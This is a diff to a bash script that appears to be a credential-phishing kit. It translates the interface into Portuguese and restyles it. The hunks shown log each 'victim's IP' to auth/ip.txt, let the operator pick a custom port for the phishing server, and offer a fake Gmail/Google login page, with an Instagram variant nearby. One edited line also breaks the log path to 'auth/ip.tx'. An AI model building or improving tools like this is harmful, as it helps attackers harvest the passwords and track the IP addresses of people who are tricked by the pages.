@@ -244,12 +244,12 @@ about() {
 cusport() {
 	echo
 
-	read -n1 -p "${GREEN}➤ Deseja utilizar uma porta personalizada? ${CYAN}[S/N] ${RESET}" P_ANS
+	read -n1 -p "${GREEN}➤ Deseja utilizar uma porta personalizada? ${CYAN}[S/N] " P_ANS
 
 	if [[ ${P_ANS} =~ ^([sSyY])$ ]]; then
 		echo
 
-		read -n4 -p "${GREEN}➤ Informe uma porta de 4 dígitos ${CYAN}[1024-9999] ${GREEN}: ${RESET}" CU_P
+		read -n4 -p "${GREEN}➤ Informe uma porta de 4 dígitos ${CYAN}[1024-9999] ${GREEN}: " CU_P
 
 		if [[ ! -z ${CU_P} && "${CU_P}" =~ ^([1-9][0-9][0-9][0-9])$ && ${CU_P} -ge 1024 ]]; then
 			PORT=${CU_P}
@@ -281,8 +281,8 @@ setup_site() {
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	echo -e "\n${CYAN}${ICON_INFO}${RESET} ${GRAY}Novo acesso registrado${RESET}\n"
+	echo -ne "${GREEN}${ICON_OK}${RESET} ${GRAY}Salvo em:${RESET} ${WHITE}auth/ip.tx${RESET}\n"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -495,13 +495,14 @@ site_instagram() {
 
 ## Gmail/Google
 site_gmail() {
-	cat <<- EOF
 
-		printf "${PURPLE}┃${RESET} ${GREEN}${BOLD}➤ [01]${RESET} ${WHITE}${BOLD}Página Tradicional De Login${RESET}\n"
+	echo
 
-	EOF
+	printf "${PURPLE}┃${RESET} ${GREEN}${BOLD}➤ [01]${RESET} ${WHITE}${BOLD}Página Tradicional De Login${RESET}\n"
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	echo
+
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" REPLY
 
 	case $REPLY in 
 		1 | 01)
